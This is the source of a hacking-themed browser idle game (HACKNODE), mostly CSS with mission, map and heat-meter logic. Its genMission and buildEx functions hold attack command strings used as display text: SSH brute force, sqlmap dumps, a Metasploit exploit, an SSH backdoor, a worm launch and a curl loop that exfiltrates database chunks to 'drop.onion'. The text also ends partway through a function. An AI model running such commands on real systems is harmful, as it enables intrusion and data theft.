<!DOCTYPE html>

<html lang="en" style="background:#050a05;">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>HACKNODE</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
<style>
  :root{--g:#00ff41;--gd:#00aa2a;--gk:#003a0f;--a:#ffb700;--r:#ff2d2d;--b:#00d4ff;--p:#cc44ff;--bg:#050a05;--b2:#080f08;--b3:#0d180d;--br:#1a3a1a;--dim:#4a7a4a;}
  *{margin:0;padding:0;box-sizing:border-box;}
  html,body{height:100%;background:#050a05;color:#00ff41;font-family:'Share Tech Mono',monospace;overflow:hidden;-webkit-user-select:none;user-select:none;}
  #crt{position:fixed;inset:0;pointer-events:none;z-index:9999;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,.022) 2px,rgba(0,255,65,.022) 4px);}
  #vig{position:fixed;inset:0;pointer-events:none;z-index:9998;background:radial-gradient(ellipse at center,transparent 55%,rgba(0,0,0,.8) 100%);}
  #app{display:flex;flex-direction:column;height:100vh;height:100dvh;max-width:480px;margin:0 auto;border-left:1px solid #1a3a1a;border-right:1px solid #1a3a1a;}
  /* HEADER */
  #hdr{padding:6px 12px;background:#080f08;border-bottom:1px solid #1a3a1a;display:flex;flex-direction:column;gap:4px;flex-shrink:0;}
  #hdr-top{display:flex;justify-content:space-between;align-items:center;}
  #logo{font-family:'Orbitron',monospace;font-size:14px;font-weight:900;letter-spacing:4px;color:#00ff41;text-shadow:0 0 10px #00ff41,0 0 20px #00ff41;}
  #hdr-right{display:flex;align-items:center;gap:10px;}
  #alias{font-size:10px;color:#4a7a4a;}#alias span{color:#ffb700;}
  #snd-btn{background:none;border:none;font-size:14px;cursor:pointer;color:#4a7a4a;-webkit-appearance:none;appearance:none;-webkit-tap-highlight-color:transparent;padding:2px 4px;}
  #snd-btn.on{color:#00ff41;}
  #stats{display:flex;gap:8px;font-size:10px;color:#4a7a4a;flex-wrap:wrap;}
  #stats .sv{color:#00ff41;}
  #faction-bar{font-size:10px;display:none;}#faction-bar.on{display:block;}
  #faction-cipher{color:#cc44ff;}#faction-ghost{color:#00d4ff;}
  #qind{font-size:10px;color:#4a7a4a;display:none;}#qind.on{display:block;}#qind span{color:#00d4ff;}
  #heatrow{display:flex;align-items:center;gap:8px;font-size:10px;}
  #hlbl{color:#4a7a4a;width:36px;flex-shrink:0;}
  #htrk{flex:1;height:5px;background:#0d180d;border:1px solid #1a3a1a;border-radius:2px;overflow:hidden;}
  #hfill{height:100%;width:0%;background:#00ff41;border-radius:2px;transition:width .3s,background .3s;}
  #hpct{width:30px;text-align:right;color:#00ff41;font-size:10px;}
  #htrk.pulse{animation:heat-pulse .4s ease-out;}
  @keyframes heat-pulse{0%{box-shadow:0 0 0 rgba(255,45,45,0);}50%{box-shadow:0 0 8px rgba(255,45,45,.6);}100%{box-shadow:0 0 0 rgba(255,45,45,0);}}
  /* Market ticker */
  #market-ticker{font-size:9px;color:#4a7a4a;display:none;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
  #market-ticker.active{display:block;}
  #market-ticker .mt-val{color:#ffb700;}
  #market-ticker .mt-warn{color:#ff2d2d;}
  /* TERMINAL */
  #term-area{display:flex;flex-direction:column;flex:1;overflow:hidden;}
  #term{flex:1;overflow-y:scroll;overflow-x:hidden;-webkit-overflow-scrolling:touch;touch-action:pan-y;padding:10px 12px;background:#050a05;font-size:12px;line-height:1.7;}
  #term::-webkit-scrollbar{width:3px;}#term::-webkit-scrollbar-thumb{background:#003a0f;border-radius:2px;}
  .ll{display:block;word-break:break-all;}
  .ok{color:#00ff41;}.warn{color:#ffb700;}.err{color:#ff2d2d;}.info{color:#00d4ff;}.dim{color:#4a7a4a;}.sep{color:#1a3a1a;}.proc{color:#cc44ff;}
  .story{color:#ffb700;}.void{color:#cc44ff;font-style:italic;}.cipher{color:#cc44ff;}.ghost{color:#00d4ff;}
  /* CMD AREA */
  #cmd-area{background:#080f08;border-top:1px solid #1a3a1a;padding:7px 12px;flex-shrink:0;}
  #phlbl{font-size:9px;letter-spacing:2px;color:#4a7a4a;margin-bottom:3px;display:none;}
  #phlbl.on{display:block;}#phlbl.proc{color:#cc44ff;}
  #countdown{font-size:11px;color:#cc44ff;margin-bottom:4px;display:none;text-align:center;letter-spacing:2px;}
  #countdown.on{display:block;}
  #progwrap{display:none;margin-bottom:5px;gap:8px;align-items:center;font-size:10px;}
  #progwrap.on{display:flex;}
  #proglbl{color:#4a7a4a;min-width:52px;font-size:9px;letter-spacing:1px;}
  #progtrk{flex:1;height:8px;background:#0d180d;border:1px solid #1a3a1a;border-radius:2px;overflow:hidden;}
  #progfill{height:100%;width:0%;background:linear-gradient(90deg,#003a0f,#00ff41);transition:width .15s;border-radius:2px;box-shadow:0 0 5px #00ff41;}
  #progfill.proc{background:linear-gradient(90deg,#330055,#cc44ff);box-shadow:0 0 5px #cc44ff;}
  #progpct{color:#00ff41;width:34px;text-align:right;}
  #prestage{display:none;margin-bottom:5px;padding:5px 8px;border:1px dashed #1a3a1a;border-radius:3px;}
  #prestage.on{display:block;}
  #prestage-lbl{font-size:9px;color:#4a7a4a;letter-spacing:1px;margin-bottom:2px;}
  #prestage-cmd{font-size:11px;display:flex;align-items:center;gap:3px;overflow:hidden;}
  #prestage-prompt{color:#4a7a4a;flex-shrink:0;font-size:10px;}
  #prestage-typed{color:#00ff41;}#prestage-rest{color:#1a3a1a;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
  #prestage-cursor{width:6px;height:12px;background:#00aa2a;display:inline-block;flex-shrink:0;animation:blink 1s step-end infinite;}
  #cmddisplay{font-size:11px;min-height:17px;margin-bottom:6px;display:flex;align-items:center;gap:4px;overflow:hidden;}
  #cmdprompt{color:#4a7a4a;flex-shrink:0;}#cmdtxt{color:#00ff41;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
  #cmdcursor{width:7px;height:13px;background:#00ff41;display:inline-block;flex-shrink:0;animation:blink 1s step-end infinite;}
  @keyframes blink{50%{opacity:0;}}
  /* BUTTONS */
  button{-webkit-appearance:none;appearance:none;-webkit-tap-highlight-color:transparent;touch-action:manipulation;border-radius:4px;}
  #tapbtn{width:100%;padding:13px;background:#0d180d;border:1px solid #003a0f;color:#00ff41;font-family:'Share Tech Mono',monospace;font-size:13px;letter-spacing:2px;cursor:pointer;text-transform:uppercase;display:block;transition:all .1s;}
  #tapbtn:active{background:#003a0f;transform:scale(.98);box-shadow:0 0 10px #00ff41;}
  #tapbtn.proc{border-color:#330055;color:#cc44ff;background:#0d0018;}
  #tapbtn.none{border-color:#1a3a1a;color:#4a7a4a;}
  #tapbtn.idle{border-color:#4a7a4a;color:#4a7a4a;font-size:11px;}
  #tapbtn.locked{opacity:.3;pointer-events:none;}
  #tapbtn.interrupt{border-color:#ff2d2d;color:#ff2d2d;background:#1a0000;animation:pred .6s ease-in-out infinite;}
  @keyframes pred{50%{box-shadow:0 0 15px #ff2d2d;}}
  /* NAV */
  #botnav{display:flex;border-top:1px solid #1a3a1a;background:#080f08;flex-shrink:0;padding-bottom:env(safe-area-inset-bottom,0px);position:relative;z-index:160;}
  .nb{flex:1;padding:12px 2px 10px;background:transparent;border:none;border-right:1px solid #1a3a1a;border-top:2px solid transparent;color:#4a7a4a;font-family:'Share Tech Mono',monospace;font-size:10px;letter-spacing:0px;cursor:pointer;text-transform:uppercase;-webkit-appearance:none;appearance:none;-webkit-tap-highlight-color:transparent;transition:color .2s,background .2s,border-top-color .2s;}
  .nb:last-child{border-right:none;}.nb.act{color:#00ff41;background:#0d180d;border-top-color:#00ff41;}.nb:active{background:#003a0f;color:#00ff41;}
  /* PANEL */
  /* PANEL — in-flow flex child, sits above botnav, never overlaps it */
  #panel{flex-shrink:0;background:#080f08;border-top:2px solid #003a0f;max-height:0;overflow:hidden;transition:max-height .25s cubic-bezier(.4,0,.2,1);}
  #panel.on{max-height:58vh;}
  /* Panel height for spacer calc: 58vh ≈ panel max height */
  .phdr{padding:10px 12px;border-bottom:1px solid #1a3a1a;font-family:'Orbitron',monospace;font-size:11px;letter-spacing:3px;color:#00aa2a;display:flex;justify-content:space-between;align-items:center;flex-shrink:0;background:#080f08;}
  .pclose{background:none;border:none;color:#4a7a4a;font-size:16px;cursor:pointer;font-family:'Share Tech Mono',monospace;padding:0 4px;-webkit-appearance:none;appearance:none;}
  #panel-content{max-height:calc(58vh - 42px);overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;touch-action:pan-y;}
  #panel-content::-webkit-scrollbar{width:3px;}#panel-content::-webkit-scrollbar-thumb{background:#003a0f;}
  /* FACTION CHOICE */
  .faction-card{margin:10px;padding:14px;border:1px solid #1a3a1a;border-radius:4px;cursor:pointer;transition:all .2s;}
  .faction-card.cipher{border-color:#330055;background:rgba(204,68,255,.05);}
  .faction-card.cipher:active{background:rgba(204,68,255,.15);}
  .faction-card.ghost{border-color:#003a55;background:rgba(0,212,255,.05);}
  .faction-card.ghost:active{background:rgba(0,212,255,.1);}
  .faction-title{font-size:13px;font-family:'Orbitron',monospace;letter-spacing:2px;margin-bottom:6px;}
  .faction-desc{font-size:10px;color:#4a7a4a;line-height:1.6;}
  /* NETWORK MAP */
  #map-container{padding:12px;font-size:11px;line-height:1.6;color:#4a7a4a;}
  #map-canvas{font-family:'Share Tech Mono',monospace;font-size:11px;line-height:1.5;white-space:pre;color:#4a7a4a;margin-bottom:12px;}
  .map-node{cursor:pointer;}
  .map-legend{font-size:9px;color:#4a7a4a;border-top:1px solid #1a3a1a;padding-top:8px;margin-top:4px;}
  /* MISSION CARDS */
  /* Mission cards — left stripe shows type, cleaner layout */
  .mc{margin:6px 10px;padding:10px 10px 10px 14px;border:1px solid #1a3a1a;border-left:3px solid #1a3a1a;border-radius:4px;background:#050a05;cursor:pointer;position:relative;transition:border-color .2s,background .2s;}
  .mc:active{background:#0d180d;}
  .mc.type-recon{border-left-color:#ffb700;}
  .mc.type-crack{border-left-color:#ff2d2d;}
  .mc.type-exfil{border-left-color:#00d4ff;}
  .mc.queued{border-color:#00d4ff;background:rgba(0,212,255,.04);}
  .mc.active-m{border-color:#00ff41;border-left-color:#00ff41;background:#0d180d;}
  .mc.locked{opacity:.32;cursor:not-allowed;}
  .mc.intel{border-right:2px solid #ffb700;}
  .mc.cipher-m{border-right:2px solid #cc44ff;}.mc.ghost-m{border-right:2px solid #00d4ff;}
  .mtitle{font-size:14px;color:#00ff41;margin-bottom:4px;display:flex;justify-content:space-between;align-items:center;gap:8px;line-height:1.2;}
  .mtag{font-size:9px;padding:2px 6px;border-radius:2px;background:#003a0f;color:#00ff41;flex-shrink:0;letter-spacing:1px;}
  .mtag.exfil{background:#001a3a;color:#00d4ff;}.mtag.crack{background:#2a0000;color:#ff2d2d;}.mtag.recon{background:#1a1a00;color:#ffb700;}
  .mdesc{font-size:11px;color:#4a7a4a;margin-bottom:6px;line-height:1.5;}
  .mreward{display:flex;gap:12px;font-size:11px;margin-bottom:3px;}
  .mreward span{color:#4a7a4a;}.mreward .v{color:#ffb700;font-size:12px;}
  .mmeta{display:flex;gap:10px;font-size:10px;flex-wrap:wrap;}
  .mmeta span{color:#4a7a4a;}.mmeta .v{color:#4a7a4a;}
  .qbadge,.intel-badge{position:absolute;top:8px;right:36px;font-size:9px;letter-spacing:1px;}
  .qbadge{color:#00d4ff;}.intel-badge{color:#ffb700;}
  .pbar-row{display:flex;align-items:center;gap:6px;font-size:9px;margin-top:4px;}
  .pbar-lbl{color:#4a7a4a;width:40px;}.pbar-trk{flex:1;height:3px;background:#0d180d;border:1px solid #1a3a1a;border-radius:1px;overflow:hidden;}.pbar-fill{height:100%;background:#003a0f;border-radius:1px;}
  /* UPGRADES */
  .usec{padding:8px 12px 3px;font-size:9px;color:#4a7a4a;letter-spacing:2px;text-transform:uppercase;border-top:1px solid #1a3a1a;}
  .usec:first-child{border-top:none;}
  .uc{margin:4px 10px;padding:9px 12px;border:1px solid #1a3a1a;border-radius:4px;background:#050a05;cursor:pointer;display:flex;justify-content:space-between;align-items:center;transition:all .15s;}
  .uc:active{background:#0d180d;}.uc.maxed{opacity:.45;cursor:not-allowed;}.uc.broke{opacity:.55;}
  .uinfo{flex:1;}.uname{font-size:12px;color:#00ff41;margin-bottom:2px;}.udesc{font-size:10px;color:#4a7a4a;}
  .ucost{text-align:right;font-size:11px;}.ucost .cv{color:#ffb700;}
  /* INTERRUPT */
  #int-ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:500;align-items:center;justify-content:center;}
  #int-ov.on{display:flex;}
  #intbox{background:#080f08;border:2px solid #ff2d2d;border-radius:6px;padding:18px;max-width:340px;width:92%;box-shadow:0 0 30px rgba(255,45,45,.3);}
  #int-title{font-family:'Orbitron',monospace;font-size:12px;color:#ff2d2d;letter-spacing:3px;margin-bottom:8px;}
  #int-body{font-size:11px;color:#4a7a4a;margin-bottom:12px;line-height:1.7;}
  #int-timer{font-size:22px;font-family:'Orbitron',monospace;color:#ff2d2d;text-align:center;margin-bottom:12px;letter-spacing:4px;}
  #int-actions{display:flex;gap:8px;flex-direction:column;}
  .ibtn{padding:11px;background:transparent;border:1px solid #ff2d2d;color:#ff2d2d;font-family:'Share Tech Mono',monospace;font-size:11px;letter-spacing:2px;cursor:pointer;text-transform:uppercase;-webkit-appearance:none;appearance:none;border-radius:4px;transition:all .1s;text-align:left;}
  .ibtn:active{background:rgba(255,45,45,.15);}
  .ibtn.safe{border-color:#00d4ff;color:#00d4ff;}.ibtn.safe:active{background:rgba(0,212,255,.1);}
  .ibtn.risky{border-color:#ffb700;color:#ffb700;}.ibtn.risky:active{background:rgba(255,183,0,.1);}
  /* SYSTEM */
  #repdisp{text-align:center;margin:10px;font-size:11px;color:#4a7a4a;}
  #repdisp .rv{color:#ffb700;font-size:14px;font-family:'Orbitron',monospace;}
  #pressec{margin:8px 10px;padding:12px;border:1px solid #ff2d2d;border-radius:4px;background:rgba(255,45,45,.04);}
  #prestitle{font-family:'Orbitron',monospace;font-size:11px;color:#ff2d2d;margin-bottom:6px;letter-spacing:2px;}
  #presdesc{font-size:10px;color:#4a7a4a;margin-bottom:10px;line-height:1.6;}
  #presbtn{width:100%;padding:10px;background:transparent;border:1px solid #ff2d2d;border-radius:4px;color:#ff2d2d;font-family:'Share Tech Mono',monospace;font-size:11px;letter-spacing:3px;cursor:pointer;text-transform:uppercase;-webkit-appearance:none;appearance:none;}
  #presbtn:active{background:rgba(255,45,45,.15);}#presbtn:disabled{opacity:.3;cursor:not-allowed;}
  /* OFFLINE */
  #offmod{display:none;position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:1000;align-items:center;justify-content:center;}
  #offmod.on{display:flex;}
  #offbox{background:#080f08;border:1px solid #003a0f;border-radius:4px;padding:18px;max-width:300px;width:90%;}
  #offbox h2{font-family:'Orbitron',monospace;font-size:11px;color:#00ff41;letter-spacing:3px;margin-bottom:10px;}
  #offlog{font-size:11px;line-height:1.8;color:#4a7a4a;margin-bottom:14px;}#offlog .hi{color:#00ff41;}
  #offok{width:100%;padding:10px;background:#003a0f;border:1px solid #00ff41;border-radius:4px;color:#00ff41;font-family:'Share Tech Mono',monospace;font-size:11px;letter-spacing:2px;cursor:pointer;-webkit-appearance:none;appearance:none;}
  /* FX */
  .cfloat{position:fixed;pointer-events:none;font-family:'Orbitron',monospace;font-size:13px;color:#ffb700;text-shadow:0 0 8px #ffb700;z-index:500;animation:fup 1.2s ease-out forwards;}
  @keyframes fup{0%{opacity:1;transform:translateY(0);}100%{opacity:0;transform:translateY(-40px);}}
  @keyframes glitch{0%,100%{transform:translate(0);filter:none;}20%{transform:translate(-4px,2px);filter:hue-rotate(90deg);}40%{transform:translate(4px,-2px);filter:hue-rotate(180deg) brightness(2);}60%{transform:translate(-2px,4px);filter:hue-rotate(270deg);}80%{transform:translate(2px,-4px);filter:brightness(3);}}
  .glitch{animation:glitch .4s ease forwards;}
  /* TERMINAL TABS */
  #term-tabs{display:flex;background:#050a05;border-bottom:1px solid #1a3a1a;flex-shrink:0;}
  .ttab{flex:1;padding:6px 4px;background:transparent;border:none;border-right:1px solid #1a3a1a;color:#4a7a4a;font-family:'Share Tech Mono',monospace;font-size:9px;letter-spacing:1px;cursor:pointer;-webkit-appearance:none;appearance:none;-webkit-tap-highlight-color:transparent;}
  .ttab:last-child{border-right:none;}.ttab.act{color:#00ff41;background:#0d180d;}.ttab:active{color:#00ff41;}
  #msg-badge{color:#ffb700;animation:pulse-badge .8s ease-in-out infinite;}
  @keyframes pulse-badge{50%{opacity:.3;}}
  .tpane{display:none;height:100%;overflow-y:scroll;overflow-x:hidden;-webkit-overflow-scrolling:touch;touch-action:pan-y;padding:10px 12px;background:#050a05;font-size:12px;line-height:1.7;}
  .tpane.act{display:block;}
  .tpane::-webkit-scrollbar{width:3px;}.tpane::-webkit-scrollbar-thumb{background:#003a0f;border-radius:2px;}

/* SECTOR MAP */
.sector-tab{display:inline-block;padding:3px 8px;margin:0 3px 6px 0;font-size:9px;border:1px solid #1a3a1a;border-radius:2px;cursor:pointer;color:#4a7a4a;-webkit-tap-highlight-color:transparent;}
.sector-tab.act{border-color:#00ff41;color:#00ff41;background:#0d180d;}
.sector-tab.locked{opacity:.3;cursor:not-allowed;}
.sector-tab.rival-cipher{border-color:#330055;color:#cc44ff;}
.sector-tab.rival-ghost{border-color:#003a55;color:#00d4ff;}

/* SCRIPTS PANEL */
.script-card{margin:6px 10px;padding:9px 12px;border:1px solid #1a3a1a;border-radius:4px;background:#050a05;display:flex;justify-content:space-between;align-items:center;gap:8px;}
.script-card.deployed{border-color:#00aa2a;background:#030803;}
.script-info{flex:1;}
.script-name{font-size:11px;color:#00ff41;margin-bottom:2px;}
.script-desc{font-size:10px;color:#4a7a4a;}
.script-stats{font-size:9px;color:#4a7a4a;margin-top:2px;}
.script-btn{padding:5px 10px;background:transparent;border:1px solid #003a0f;color:#00aa2a;font-family:‘Share Tech Mono’,monospace;font-size:9px;letter-spacing:1px;cursor:pointer;border-radius:3px;-webkit-appearance:none;appearance:none;flex-shrink:0;}
.script-btn.active{border-color:#ff2d2d;color:#ff2d2d;}
.slot-bar{margin:8px 10px 4px;padding:8px 12px;border:1px solid #1a3a1a;border-radius:4px;font-size:10px;color:#4a7a4a;}
.slot-track{display:flex;gap:3px;margin-top:4px;}
.slot-pip{width:12px;height:12px;border:1px solid #1a3a1a;border-radius:2px;background:#0d180d;}
.slot-pip.used{background:#00ff41;border-color:#00aa2a;}
.slot-pip.used.mining{background:#ffb700;border-color:#aa7700;}

/* RIVAL NODE */
.rival-card{margin:6px 10px;padding:8px 12px;border:1px solid #330055;border-radius:4px;background:rgba(204,68,255,.04);cursor:pointer;font-size:10px;}
.rival-card.ghost-rival{border-color:#003a55;background:rgba(0,212,255,.04);}
.rival-card:active{opacity:.7;}

/* NEWS */
.news-item{padding:8px 0;border-bottom:1px solid #1a3a1a;font-size:11px;color:#4a7a4a;line-height:1.6;}
.news-item .nh{color:#ffb700;font-size:10px;letter-spacing:1px;margin-bottom:2px;}
.news-item.alert .nh{color:#ff2d2d;}

/* BOOT */
#boot{position:fixed;inset:0;background:#050a05;z-index:2000;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:16px;}
#bootlogo{font-family:‘Orbitron’,monospace;font-size:28px;font-weight:900;letter-spacing:8px;color:#00ff41;text-shadow:0 0 20px #00ff41,0 0 40px #00ff41;animation:glow 1s ease-in-out infinite;}
@keyframes glow{50%{text-shadow:0 0 40px #00ff41,0 0 80px #00ff41;}}
#bootstatus{font-size:11px;color:#4a7a4a;letter-spacing:2px;}
</style>

</head>
<body style="background:#050a05;color:#00ff41;">

function rnd(a,b){return Math.floor(Math.random()*(b-a+1))+a;}
function randIP(){return `${rnd(10,220)}.${rnd(0,255)}.${rnd(0,255)}.${rnd(1,254)}`;}
function randSN(){return `${rnd(10,192)}.${rnd(0,255)}.${rnd(0,255)}.0/24`;}
function randPort(){return [22,23,80,443,3306,5432,8080,8443,27017,6379][rnd(0,9)];}
function randUser(){return ['admin','root','user','ubuntu','postgres','deploy','svc_acc','dbadmin'][rnd(0,7)];}
function randCVE(){return `CVE-${rnd(2020,2024)}-${rnd(1000,99999)}`;}
function randHash(){return Array.from({length:8},()=>'0123456789abcdef'[rnd(0,15)]).join('');}
function randFS(){return [512,1024,4096,16384,51200,102400,512000,1048576,2457600][rnd(0,8)];}
function fmtFS(kb){if(kb>=1024*1024)return(kb/1024/1024).toFixed(1)+'GB';if(kb>=1024)return(kb/1024).toFixed(1)+'MB';return kb+'KB';}
function buildEx(u,ip,kb){
  const m=kb/1024;
  if(m<10)return`scp -r ${u}@${ip}:/var/db/corp ./exfil/`;
  if(m<100)return`scp -r -C ${u}@${ip}:/var/db/corp /tmp/stage/ && tar -czf dump.tar.gz /tmp/stage/`;
  if(m<1024)return`rsync -avz --bwlimit=512 ${u}@${ip}:/var/db/ ./exfil/ --exclude="*.log"`;
  return`rsync -avz --bwlimit=256 ${u}@${ip}:/var/db/ ./stage/ && split -b 256m ./stage/dump.sql chunk_ && for f in chunk_*; do curl -s -F "file=@$f" http://drop.onion/up; done`;
}

function genMission(t){
  const intel=G.knownTargets[t.id];
  const ip=intel?.ip||randIP(),sn=intel?.sn||randSN(),port=intel?.port||randPort(),user=intel?.user||randUser();
  const cve=randCVE(),hash=randHash(),fs=randFS(),corp=intel?.corp||randCorp(G.currentSector);
  const ib=!!intel;
  const cmds={
    nmap_scan:`nmap -sV -p ${port} ${sn}`,
    john_crack:`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=sha256`,
    hydra_ssh:`hydra -l ${user} -P rockyou.txt ssh://${ip}`,
    nc_listen:`nc -lvnp 4444 & python3 -c "import pty;pty.spawn('/bin/bash')" | nc ${ip} 4444`,
    scp_exfil:buildEx(user,ip,fs),
    aircrack:`aircrack-ng -w rockyou.txt -b ${ip.split('.').slice(0,3).join('.')}:XX:XX:XX:XX capture.cap`,
    sqlmap:`sqlmap -u "http://${ip}/login.php?id=1" --dump --batch --level=3`,
    metasploit:`msfconsole -x "use exploit/ms17_010; set RHOST ${ip}; set LHOST 0.0.0.0; run"`,
    ssh_backdoor:`ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_bd -N "" && ssh-copy-id -i ~/.ssh/id_bd.pub ${user}@${ip}`,
    worm_deploy:`python3 worm.py --target ${ip} --persist --hash ${hash} --c2 drop.onion`,
  };
  // Sector-appropriate target labels
  const s=G.currentSector;
  const targetLabel=s===0?`local host (${ip})`:`${corp} (${ip})`;
  const targetShort=s===0?`local host`:`${corp}`;
  const descs={
    nmap_scan:s===0
      ?`Wardrive block ${sn}. Discover nearby open devices.`
      :`Scan ${sn}. Map ${corp}'s network surface.`,
    john_crack:`Crack hash dump from ${targetShort}. No network trace.`,
    hydra_ssh:`Brute force SSH on ${targetLabel} as '${user}'.${ib?' [INTEL ACTIVE]':''}`,
    nc_listen:`Catch reverse shell from ${targetLabel}.`,
    scp_exfil:`Pull ${fmtFS(fs)} from ${targetLabel}.${ib?' [INTEL: faster xfer]':''}`,
    aircrack:`Crack WiFi near ${targetShort} — slow, untraceable.`,
    sqlmap:`SQL inject login portal at ${targetLabel}.`,
    metasploit:`Deploy ${cve} against ${targetLabel}.${ib?' [INTEL: trace -30%]':''}`,
    ssh_backdoor:`Install persistent backdoor on ${targetLabel}.`,
    worm_deploy:`Deploy C2 node inside ${targetLabel}.`,
  };
  return{...t,command:cmds[t.id]||'',desc:descs[t.id]||'',_fs:fs,_ip:ip,_sn:sn,_port:port,_user:user,_corp:corp,_intelBonus:ib};
}

function initNetworkMap(){
  MAP_NODES.forEach(n=>{
    if(!G.networkNodes[n.id]){
      const startStatus = n.id==='local_net' ? 'scanned' : 'unknown';
      G.networkNodes[n.id]={status:startStatus, name:n.name, sector:n.sector, nodeHeat:0};
    } else if(G.networkNodes[n.id].nodeHeat===undefined){
      G.networkNodes[n.id].nodeHeat=0; // migrate old saves
    }
  });
}

// Node heat decays slowly when you're not actively hitting that node
function nodeHeatTick(){
  Object.values(G.networkNodes||{}).forEach(n=>{
    if(n.nodeHeat>0){
      n.nodeHeat=Math.max(0,n.nodeHeat-0.5); // decay 0.5/tick (every 5s)
    }
  });
}

function revealMapNode(nodeId){
  if(G.networkNodes[nodeId]&&G.networkNodes[nodeId].status==='unknown'){
    G.networkNodes[nodeId].status='scanned';
    const node=MAP_NODES.find(n=>n.id===nodeId);
    log(`> MAP UPDATE: ${node?.name||nodeId} discovered`,'info');
  }
}

// Recon reveals nodes based on current sector
function onReconComplete(){
  const sector=G.currentSector;

  if(sector===0){
    // Reveal one unknown local node
    const unknownLocal=MAP_NODES.filter(n=>n.sector===0&&G.networkNodes[n.id]?.status==='unknown');
    if(unknownLocal.length>0){
      const target=unknownLocal[rnd(0,unknownLocal.length-1)];
      revealMapNode(target.id);
    } else {
      // All local nodes revealed — generate a random new node (fluff host)
      addRandomLocalNode();
    }
  } else {
    // Reveal one unknown node in current sector
    const unknownSector=MAP_NODES.filter(n=>n.sector===sector&&G.networkNodes[n.id]?.status==='unknown');
    if(unknownSector.length>0){
      const target=unknownSector[rnd(0,unknownSector.length-1)];
      revealMapNode(target.id);
      // Seeding rivals when we first see nodes in hostile sectors
      setTimeout(()=>initRivalNodes(),500);
    } else {
      // All sector nodes revealed — generate a random host in this sector
      addRandomLocalNode(sector);
    }
  }
}

// MISSION CHAIN SYSTEM
// ═══════════════════════════════════════════════
function generateMissionForNode(nodeId){
  const nodeDef=MAP_NODES.find(n=>n.id===nodeId);
  if(!nodeDef)return null;
  const nodeState=G.networkNodes[nodeId];
  if(!nodeState||nodeState.status==='unknown')return null;
  const template=MISSION_TEMPLATES[nodeDef.nodeType];
  if(!template)return null;
  // Check all tools in chain are unlocked
  const allT=[...MT,...Object.values(FACTION_MT).flat()];
  const stepsUnlocked=template.steps.every(tid=>{
    const t=allT.find(t=>t.id===tid);
    return t&&G.missionsCompleted>=t.unlockAt[0];
  });
  if(!stepsUnlocked)return null;
  const ip=nodeState.ip||randIP();
  return{
    id:'mc_'+randHash(),
    nodeId,
    nodeName:nodeDef.name,
    name:template.name(nodeDef),
    flavor:template.flavor(nodeDef),
    steps:template.steps.map(tid=>({toolId:tid,status:'pending',loot:null})),
    currentStep:0,
    bonusMultiplier:template.bonusMultiplier,
    securityTier:template.securityTier,
    startedAt:null,
    nodeIp:ip,
  };
}

function startMissionChain(nodeId){
  if(G.activeMissionChain){log('> Mission already in progress.','warn');return;}
  if(G.missionRunning){log('> Finish current tool first.','warn');return;}
  const nodeState=G.networkNodes[nodeId];
  if(nodeState?.status==='owned'){log(`> ${nodeState.name||nodeId} is already under your control.`,'dim');return;}
  // Check cooldown
  if(G.nodeCooldowns[nodeId]&&Date.now()<G.nodeCooldowns[nodeId]){
    const mins=Math.ceil((G.nodeCooldowns[nodeId]-Date.now())/60000);
    log(`> Node on cooldown. Available in ${mins}min.`,'warn');return;
  }
  const chain=generateMissionForNode(nodeId);
  if(!chain){
    // Give a clear reason rather than a generic error
    const nodeDef=MAP_NODES.find(n=>n.id===nodeId);
    const template=MISSION_TEMPLATES[nodeDef?.nodeType];
    if(!template){log(`> No mission template for this node type (${nodeDef?.nodeType||'unknown'}). Discover more to unlock.`,'dim');}
    else{
      const allT=[...MT,...Object.values(FACTION_MT).flat()];
      const locked=template.steps.filter(tid=>{const t=allT.find(t=>t.id===tid);return t&&G.missionsCompleted<t.unlockAt[0];});
      if(locked.length)log(`> Tools locked for this mission: need ${locked.map(tid=>{const t=allT.find(t=>t.id===tid);return t?`${t.name} (${t.unlockAt[0]} ops)`:tid;}).join(', ')}.`,'warn');
      else log(`> Cannot generate mission for this node.`,'warn');
    }
    return;
  }
  chain.startedAt=Date.now();
  G.activeMissionChain=chain;
  logSep();
  log(`> MISSION ACCEPTED: ${chain.name}`,'ok');
  log(`> ${chain.flavor}`,'dim');
  log(`> ${chain.steps.length} steps — ${chain.steps.map(s=>{const t=MT.find(t=>t.id===s.toolId);return t?t.name:'?';}).join(' → ')}`,'info');
  logSep();
  save();
  // Kick off first step
  advanceMissionChain();
  showPanel('none');
  if(curPanel==='missions')renderPanel('missions');
}

function advanceMissionChain(){
  if(!G.activeMissionChain)return;
  const chain=G.activeMissionChain;
  const step=chain.steps[chain.currentStep];
  if(!step)return;
  step.status='active';
  // Rise node heat each step — more ops against same target = hotter
  if(G.networkNodes[chain.nodeId]){
    G.networkNodes[chain.nodeId].nodeHeat=Math.min(100,(G.networkNodes[chain.nodeId].nodeHeat||0)+15);
  }
  log(`> STEP ${chain.currentStep+1}/${chain.steps.length}: ${getMissionToolName(step.toolId)}`,'info');
  // bypassCredits=true — chain already committed, don't gate on credit requirements
  selectMission(step.toolId, false, true);
}

function getMissionToolName(toolId){
  const t=[...MT,...Object.values(FACTION_MT).flat()].find(t=>t.id===toolId);
  return t?t.name:toolId;
}

function onMissionToolComplete(toolId,lootGenerated){
  if(!G.activeMissionChain)return;
  const chain=G.activeMissionChain;
  const step=chain.steps[chain.currentStep];
  if(!step||step.toolId!==toolId)return;
  step.status='done';
  step.loot=lootGenerated;
  chain.currentStep++;
  if(chain.currentStep>=chain.steps.length){
    completeMissionChain();
  } else {
    // Brief pause then advance to next step
    setTimeout(()=>{
      if(G.activeMissionChain)advanceMissionChain();
    },800);
  }
}

function completeMissionChain(){
  const chain=G.activeMissionChain;
  if(!chain)return;
